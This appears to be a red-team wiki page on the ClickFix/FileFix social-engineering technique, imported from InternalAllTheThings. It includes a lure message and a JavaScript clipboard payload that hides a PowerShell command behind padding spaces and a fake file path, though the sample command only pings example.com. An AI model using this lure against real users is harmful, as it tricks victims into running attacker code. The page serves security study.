---
title: ClickFix
type: technique
tags: [initial-access, phishing, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# ClickFix

## What it is

> ClickFix is a social engineering attack that prompts users to unknowingly execute malicious code, usually through the Run Dialog (`Windows Key + R`).

## How it works

ClickFix is a social engineering technique that presents the victim with a fake error dialog or CAPTCHA that instructs them to press `Win+R`, paste a command from the clipboard, and press Enter, executing attacker-controlled PowerShell or mshta commands via the Windows Run dialog. The attacker pre-populates the victim's clipboard with a malicious command using JavaScript (`navigator.clipboard.writeText`), so the victim unknowingly pastes it. Because the command runs in the user's own context via a native Windows dialog, it bypasses many browser-based security controls and phishing filters.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

> ClickFix is a social engineering attack that prompts users to unknowingly execute malicious code, usually through the Run Dialog (`Windows Key + R`).

## FileFix

Display a message to the user to lure him into copying and pasting a command in a shell or equivalent (File Explorer).

```ps1
To access the file, follow these steps:
1. Copy the file path below:
   `C:\company\internal-secure\filedrive\HRPolicy.docx`
2. Open File Explorer and select the address bar (CTRL + L)
3. Paste the file path and press Enter
```

When the user clicks on the "COPY" button, it should set the content of his clipboard to the following.

```ps1
navigator.clipboard.writeText("powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ");
```

Here, a few tricks have been added to improve the efficiency of the payload:

* Multiple spaces to hide the start of the payload
* A comment with `#` containing a fake path to the document

Executable files (e.g. .exe) executed through the File Explorer’s address bar have their Mark of The Web (MOTW) attribute removed.

## References

* [FileFix - A ClickFix Alternative - mrd0x - June 23, 2025](https://mrd0x.com/filefix-clickfix-alternative/)
* [FileFix (Part 2) - mrd0x - June 30, 2025](https://mrd0x.com/filefix-part-2/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
